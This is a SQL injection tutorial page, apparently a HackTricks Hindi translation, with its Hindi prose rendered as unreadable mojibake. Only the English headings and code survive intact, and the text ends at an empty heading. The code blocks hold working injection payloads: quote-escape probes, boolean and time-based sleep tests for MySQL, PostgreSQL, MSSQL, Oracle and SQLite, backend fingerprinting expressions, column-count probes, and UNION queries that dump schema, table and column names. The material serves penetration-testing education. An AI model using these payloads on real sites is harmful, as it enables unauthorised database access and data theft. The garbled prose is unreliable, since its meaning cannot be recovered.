# SQL Injection

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдЪрд╛рд╣рд┐рдП**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд╛рдК рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## SQL Injection рдХреНрдпрд╛ рд╣реИ?

**SQL injection** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рджрд╛рддрд╛рдУрдВ рдХреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреНрд╡реЗрд░реА рдореЗрдВ **рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдХрдордЬреЛрд░реА рд╣рдорд▓рд╛рд╡рджрд╛рддрд╛рдУрдВ рдХреЛ рдЙрди рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдиреНрд╣реЗрдВ рдкрд╣реБрдВрдЪрдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рдРрд╕рд╛ рдХреЛрдИ рднреА рдбреЗрдЯрд╛ рдЬрд┐рд╕рдХрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред рдРрд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛ рдпрд╛ рд╕рд╛рдордЧреНрд░реА рдореЗрдВ рд╕реНрдерд╛рдпреА рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ рд╕рд░реНрд╡рд░ рдХрд╛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдпрд╛ рд╕реЗрд╡рд╛ рдХреА рдирд╛рдкрд╕рдВрджреА рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддреА рд╣реИред

## рдкреНрд░рд╡реЗрд╢ рдмрд┐рдВрджреБ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЬрдм рдПрдХ рд╕рд╛рдЗрдЯ **SQL рдЗрдВрдЬреЗрдХреНрд╢рди (SQLi)** рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд┐рдд рджрд┐рдЦрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЕрд╕рд╛рдорд╛рдиреНрдп рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ SQLi рд╕рдВрдмрдВрдзрд┐рдд рдЗрдирдкреБрдЯреНрд╕ рдХреЛ, **рдкрд╣рд▓рд╛ рдХрджрдо** рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рд╕рдордЭрдирд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ **рдХреНрд╡реЗрд░реА рдореЗрдВ рдбреЗрдЯрд╛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ рдмрд┐рдирд╛ рдЗрд╕реЗ рдмрд┐рдЧрд╛рдбрд╝реЗ**ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдореМрдЬреВрджрд╛ рд╕рдВрджрд░реНрдн рд╕реЗ **рдирд┐рдХрд▓рдиреЗ рдХреА рд╡рд┐рдзрд┐** рдХреЛ рдкрд╣рдЪрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдпреЗ рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
рддреЛ, рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рдХреНрд╡реЗрд░реА рдореЗрдВ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдХреИрд╕реЗ рдареАрдХ рдХреА рдЬрд╛рдПрдВ**ред рдХреНрд╡реЗрд░реА рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рдЗрдирдкреБрдЯ** рдбреЗрдЯрд╛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдкрд┐рдЫрд▓реА рдХреНрд╡реЗрд░реА рдирдП рдбреЗрдЯрд╛ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗ**, рдпрд╛ рдлрд┐рд░ рдЖрдк рдЕрдкрдирд╛ рдбреЗрдЯрд╛ **рдЗрдирдкреБрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдПрдХ рдЯрд┐рдкреНрдкрдгреА рдкреНрд░рддреАрдХ рдХреЛ рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдЧрд░ рдЖрдк рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдкрдХреЛ рдпрд╣ рдкрддрд╛ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрдм рдХреНрд╡реЗрд░реА рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИ рдФрд░ рдХрдм рдирд╣реАрдВ, рддреЛ рдпрд╣ рдЪрд░рдг рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рдПрдЧрд╛ред_

### **рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### рддрд╛рд░реНрдХрд┐рдХ рдкрд░рд┐рдЪрдп рдХреА рдкреБрд╖реНрдЯрд┐

рдПрдХ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рддрд░реАрдХрд╛ **рддрд╛рд░реНрдХрд┐рдХ рдкрд░рд┐рдЪрдп** рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрд░рд┐рдгрд╛рдореЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдирд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ GET рдкреИрд░рд╛рдореАрдЯрд░ рдЬреИрд╕реЗ `?username=Peter` рдЬрдм `?username=Peter' рдпрд╛ '1'='1` рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдПрдХ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреА рдирд┐рд╢реНрдЪрд┐рдд рд╕рдВрдХреЗрдд рд╣реИред

рдЗрд╕реА рддрд░рд╣, **рдЧрдгрд┐рддреАрдп рдкрд░рд┐рдЪрдп** рдХрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдПрдХ рдкреНрд░рднрд╛рд╡реА рдкреБрд╖реНрдЯрд┐ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ `?id=1` рдФрд░ `?id=2-1` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдкрд░ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд╛ рд╕рдВрдХреЗрдд рд╣реИред

рддрд╛рд░реНрдХрд┐рдХ рдкрд░рд┐рдЪрдп рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрджрд╛рд╣рд░рдг:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
рдпрд╣ рд╢рдмреНрдж-рд╕реВрдЪреА рдмрдирд╛рдИ рдЧрдИ рдереА рддрд╛рдХрд┐ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рддрд░реАрдХреЗ рд╕реЗ **SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреА рдкреБрд╖реНрдЯрд┐** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### рд╕рдордп рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛

рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣ **рдХреЛрдИ рднреА рдкрд░рд┐рд╡рд░реНрддрди рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧреА** рдЬрд┐рд╕реЗ рдЖрдк рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, **рдмреНрд▓рд╛рдЗрдВрдб SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рд░рдЦреЗрдВ рдФрд░ рдпрд╣ рдкреГрд╖реНрда рд▓реЛрдб рд╣реЛрдиреЗ рдореЗрдВ **рд╕рдордп рдкрд░ рдкреНрд░рднрд╛рд╡** рд╣реЛрдЧрд╛ред\
рдЗрд╕рд▓рд┐рдП, рд╣рдо SQL рдХреНрд╡реЗрд░реА рдореЗрдВ рдПрдХ рдСрдкрд░реЗрд╢рди рдЬреЛ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рд▓реЗрдЧрд╛, рдЬреЛрдбрд╝рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдиреАрдВрдж рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА**ред рддрдм, рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЖрдк рдХреНрд╡реЗрд░реА рдХреЛ **рдЬрдЯрд┐рд▓ рдСрдкрд░реЗрд╢рди рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдИ рд╕реЗрдХрдВрдб рд▓реЗ рд╕рдХрддрд╛ рд╣реИред _рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдкрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред_

### рдкреАрдЫреЗ-рдПрдВрдб рдХреА рдкрд╣рдЪрд╛рди

рдкреАрдЫреЗ-рдПрдВрдб рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╡рд┐рднрд┐рдиреНрди рдкреАрдЫреЗ-рдПрдВрдб рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ рд╣реИред рдЖрдк рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреЗ _**рдиреАрдВрдж**_ **рдлрд╝рдВрдХреНрд╢рди** рдпрд╛ рдЗрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЯреЗрдмрд▓ рд╕реЗ [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреНрд╡реЗрд░реА рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
рдПрдХ рдЖрдЧреЗ рд╣рдо рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА SQL Injection рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рдкрд░ рдЪрд░реНрдЪрд╛ рдХрд░реЗрдВрдЧреЗред рд╣рдо MySQL рдХрд╛ рдЙрджрд╛рд╣рд░рдг рд▓реЗрдВрдЧреЗред
{% endhint %}

### рдкреЛрд░реНрдЯрд╕реНрд╡рд┐рдЧрд░ рдХреЗ рд╕рд╛рде рдкрд╣рдЪрд╛рди

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Union Based рдХрд╛ рд╢реЛрдзрди

### рд╕реНрддрдВрднреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдпрджрд┐ рдЖрдк рдХреНрд╡реЗрд░реА рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЗрд╕реЗ рдЗрд╕рдХрд╛ рд╢реНрд░реЗрд╖реНрда рддрд░реАрдХрд╛ рдЙрд╕рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред\
рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз** рдХрд┐рддрдиреЗ **рд╕реНрддрдВрдн** рд╡рд╛рдкрд╕ рдХрд░ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рджреЛрдиреЛрдВ рдХреНрд╡реЗрд░реА рдХреЛ рд╕рдорд╛рди рд╕рдВрдЦреНрдпрд╛ рдХреЗ рд╕реНрддрдВрдн рд╡рд╛рдкрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред\
рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдо рддреМрд░ рдкрд░ рджреЛ рд╡рд┐рдзрд┐рдпрд╛рдБ рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ:

#### рдХреНрд░рдо/рд╕рдореВрд╣ рджреНрд╡рд╛рд░рд╛

рдХреНрд╡реЗрд░реА рдореЗрдВ рд╕реНрддрдВрднреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **ORDER BY** рдпрд╛ **GROUP BY** рд╢рд░реНрддреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдмрдврд╝рд╛рддреЗ рд╣реБрдП рдПрдХ рдЧрд▓рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рддрдХ рдмрджрд▓реЗрдВред SQL рдХреЗ рднреАрддрд░ **GROUP BY** рдФрд░ **ORDER BY** рдХреА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рджреЛрдиреЛрдВ рдХреНрд╡реЗрд░реА рдХреЗ рд╕реНрддрдВрднреЛрдВ рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП рдпреЗ рдПрдХрд╕рдорд╛рди рд░реВрдк рд╕реЗ рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

рдЪреБрдиреЗрдВ рдФрд░ рдФрд░ рдЕрдзрд┐рдХ null рдорд╛рдиреНрдпрддрд╛рдПрдБ рддрдХ рдЬрдм рддрдХ рдХреНрд╡реЗрд░реА рд╕рд╣реА рди рд╣реЛ рдЬрд╛рдП:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_рдЖрдкрдХреЛ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ `null` рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХреНрд╡реЗрд░реА рдХреЗ рджреЛрдиреЛрдВ рдУрд░ рдХреА рд╕реНрддрдВрднреЛрдВ рдХреЗ рдкреНрд░рдХрд╛рд░ рд╕рдорд╛рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рд░ рдорд╛рдорд▓реЗ рдореЗрдВ `null` рдорд╛рди рдорд╛рдиреНрдп рд╣реИред_

### рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо, рддрд╛рд▓рд┐рдХрд╛ рдирд╛рдо рдФрд░ рд╕реНрддрдВрдн рдирд╛рдореЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ

рдЕрдЧрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╣рдо рд╕рднреА рдбреЗрдЯрд╛рдмреЗрд╕реЛрдВ рдХрд╛ рдирд╛рдо, рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдирд╛рдо, рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рд╕реНрддрдВрднреЛрдВ рдХрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_рд╣рд░ рд╡рд┐рднрд┐рдиреНрди рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╣рдореЗрд╢рд╛ рдПрдХ рд╣реА рдореЗрдердбреЛрд▓реЙрдЬреА рд╣реЛрддреА рд╣реИред_

## рдЫрд┐рдкреА рд╣реБрдИ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рд╢реЛрдз

